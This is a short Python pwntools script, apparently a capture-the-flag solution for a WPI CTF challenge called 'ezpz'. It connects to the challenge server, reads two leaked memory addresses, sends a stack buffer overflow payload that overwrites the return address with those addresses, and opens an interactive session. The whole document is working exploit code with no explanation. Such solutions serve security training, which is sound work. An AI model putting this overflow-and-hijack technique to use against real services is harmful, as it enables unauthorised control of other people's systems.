from pwn import *

#r = process(["./ezpz"])
r = remote("ezpz.wpictf.xyz", 31337)
data= r.recvline()[:-1].split()
addr = int(data[1],16)
main = int(data[3],16)
print hex(addr),hex(main)
r.sendline("a"*0x88+p64(addr)*2+p64(main))

r.interactive()
